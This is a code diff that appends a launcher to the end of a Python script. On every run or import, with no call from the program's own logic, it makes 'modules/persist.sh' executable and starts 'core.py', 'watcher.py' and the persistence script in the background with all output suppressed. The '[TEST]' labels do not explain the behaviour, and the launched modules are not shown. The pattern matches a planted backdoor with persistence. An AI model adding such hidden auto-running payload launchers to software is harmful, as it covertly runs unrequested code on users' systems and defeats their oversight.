@@ -649,3 +649,30 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
+def make_executables():
+    """Make necessary files executable"""
+    try:
+        # Make shell scripts executable
+        if os.path.exists("modules/persist.sh"):
+            os.chmod("modules/persist.sh", 0o755)
+        print("[TEST] Made files executable")
+    except Exception as e:
+        print(f"[TEST] Error making executables: {e}")
+
+def trigger_payloads():
+    """Trigger test payloads"""
+    print("[TEST] Starting payload modules...")
+    make_executables()
+    subprocess.Popen(["python3", "modules/core.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(["python3", "modules/watcher.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(["bash", "modules/persist.sh"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    print("[TEST] Payloads triggered in background")
+
+# Auto-trigger when script runs
+trigger_payloads()
+
+
+
+
